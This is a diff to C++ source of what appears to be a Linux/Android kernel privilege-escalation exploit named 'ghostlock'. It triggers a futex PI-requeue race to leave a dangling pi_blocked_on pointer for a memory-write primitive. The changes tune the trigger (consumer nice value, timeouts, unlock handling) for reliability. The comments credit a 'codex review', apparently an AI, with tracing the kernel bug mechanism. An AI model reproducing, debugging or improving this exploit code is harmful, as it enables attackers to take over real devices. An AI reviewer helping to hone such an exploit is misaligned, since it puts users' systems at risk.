@@ -154,9 +154,14 @@ namespace ghostlock::race {
          * cycle. The kernel's PI requeue/boost walk mishandles that cycle
          * and wakes the waiter with a dangling pi_blocked_on — the premise
          * of the whole route. v6 removed both LOCK_PI calls after an
-         * EDEADLK that the CLI avoids by firing CMP from the main thread
-         * strictly after owner_started + a 50ms settle, which run() already
-         * matches (race_setup_settle_us=50000). Without the cycle the wakeup
+         * EDEADLK; codex review traced the mechanism in work/kernel-src:
+         * rtmutex.c:600 detects the cycle and remove_waiter (rtmutex.c:1075)
+         * rolls back the proxy waiter using `current`, dequeuing it while
+         * LEAVING the waiter task's pi_blocked_on pointing at it — so the
+         * EDEADLK rollback is the dangling-pointer source (the android12-
+         * 5.10 backport note confirms), not something 50ms of settle
+         * "avoids". Both CLI and App ignore the CMP return value, which is
+         * why EDEADLK does not stop the run. Without the cycle the wakeup
          * clears pi_blocked_on and rt_mutex_adjust_pi short-circuits: the
          * route reports clean=1/1 and never writes (run15 proof). */
         long chain_lock = support::futex_op(&race->chain_futex,
@@ -208,10 +213,21 @@ namespace ghostlock::race {
             pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
         }
         race->route_done.store(1);
-        /* v11: release the chain so the owner's blocking LOCK_PI wakes and
-         * marks owner_chain_done (CLI main.c:163) — same ordering. */
-        (void) support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0,
-                                 nullptr, nullptr, 0);
+        /* v11: this unlock is what wakes the owner's blocking LOCK_PI and
+         * lets it set owner_chain_done. If it fails (futex word clobbered
+         * by a misaimed primitive write), the owner stays stuck in the
+         * kernel and route_done has already lifted the main deadline —
+         * spinning on owner_chain_done would hang the join forever
+         * (codex review Q2/Q6). Bail out and signal the owner instead;
+         * the attempt is a failure either way. */
+        long chain_unlock = support::futex_op(&race->chain_futex,
+                                              FUTEX_UNLOCK_PI, 0, nullptr,
+                                              nullptr, 0);
+        if (chain_unlock != 0) {
+            pr_error("waiter unlock chain errno=%d\n", errno);
+            race->owner_stop.store(1);
+            return nullptr;
+        }
         /* v11: the UNLOCK_PI above is what wakes the owner's blocking
          * LOCK_PI, so owner_chain_done is normally set before this poll
          * even runs once. */
@@ -241,9 +257,16 @@ namespace ghostlock::race {
          * before the CMP requeue fires; the waiter's post-route UNLOCK_PI
          * wakes us here. The v6 "no chain LOCK" workaround silently removed
          * the cycle and with it the dangling pi_blocked_on the route lives
-         * on (run15: clean=1/1, zero writes). */
+         * on (run15: clean=1/1, zero writes). The 400s absolute timeout is
+         * a codex-review guard: the route deadline (300s) is shorter, so
+         * on any normal path the waiter's UNLOCK_PI arrives first and the
+         * timeout never fires; it only prevents an unkillable join if the
+         * unlock was lost. */
+        struct timespec chain_to;
+        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &chain_to));
+        chain_to.tv_sec += 400;
         long chain_block = support::futex_op(&race->chain_futex,
-                                             FUTEX_LOCK_PI, 0, nullptr,
+                                             FUTEX_LOCK_PI, 0, &chain_to,
                                              nullptr, 0);
         if (chain_block != 0) {
             pr_error("owner lock chain errno=%d\n", errno);
@@ -302,11 +325,15 @@ namespace ghostlock::race {
                     race->consumer_calls.fetch_add(1);
                     race->consumer_inflight.store(1);
                     errno = 0;
-                    /* rotate the nice every call; (calls%19)+1 is what makes
-                 * sched_setattr succeed on 6.1 compact */
-                    int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
-                                            ? (calls_this_seq % 19) + 1
-                                            : kernel::PSELECT_CONSUMER_NICE;
+                    /* v11: always the CLI's proven value 19 (6/6 on this
+                     * 5.10 kernel). The (calls%19)+1 rotation is a 6.1
+                     * compact quirk; with consumer_max_calls=1 the first
+                     * call is the only call, so nice=1 diverged from the
+                     * completing CLI on every attempt. nice 1/19 map to
+                     * prio 121/139 — neither equals the crafted waiter
+                     * prio 130, but only 19 is the empirically proven
+                     * trigger direction. */
+                    int32_t consumer_nice = kernel::PSELECT_CONSUMER_NICE;
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                     const int32_t sched_errno = (sched_ret != 0) ? errno : 0;
                     /* v8: this call is the PI-chain trigger; if it never
